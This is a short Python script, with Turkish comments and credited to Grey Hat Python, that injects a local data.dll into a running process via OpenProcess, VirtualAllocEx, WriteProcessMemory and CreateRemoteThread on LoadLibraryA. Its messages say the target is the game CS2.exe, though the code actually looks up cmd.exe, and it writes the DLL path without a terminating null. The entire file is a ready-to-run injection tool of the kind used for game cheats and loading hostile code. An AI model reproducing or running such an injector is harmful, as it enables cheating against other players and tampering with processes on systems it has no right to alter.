import sys
import os
import psutil
from ctypes import *

# CS2'nin PID'sini bul
def get_pid_by_name(proc_name):
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['name'].lower() == proc_name.lower():
            return proc.info['pid']
    return None

print("DLL Injector implementation in Python")
print("Taken from Grey Hat Python")

cs2_pid = get_pid_by_name("cmd.exe")
if not cs2_pid:
    print("[!] CS2.exe çalışmıyor veya bulunamadı.")
    sys.exit(0)

# data.dll dosyasını çalıştığımız dizinden al
dll_path = os.path.join(os.getcwd(), "data.dll")
if not os.path.exists(dll_path):
    print(f"[!] DLL dosyası bulunamadı: {dll_path}")
    sys.exit(0)

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
dll_len = len(dll_path)

# Get handle to process being injected...
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, cs2_pid)

if not h_process:
    print(f"[!] Couldn't get handle to PID: {cs2_pid}")
    print(f"[!] Are you sure CS2.exe is running?")
    sys.exit(0)

# Allocate space for DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# Write DLL path to allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), dll_len, byref(written))

# Resolve LoadLibraryA Address
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

# Now we createRemoteThread with entrypoint set to LoadLibraryA and pointer to DLL path as param
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print("[!] Failed to inject DLL, exit...")
    sys.exit(0)

print(f"[+] Remote Thread with ID 0x{thread_id.value:08x} created in CS2.exe (PID: {cs2_pid})")
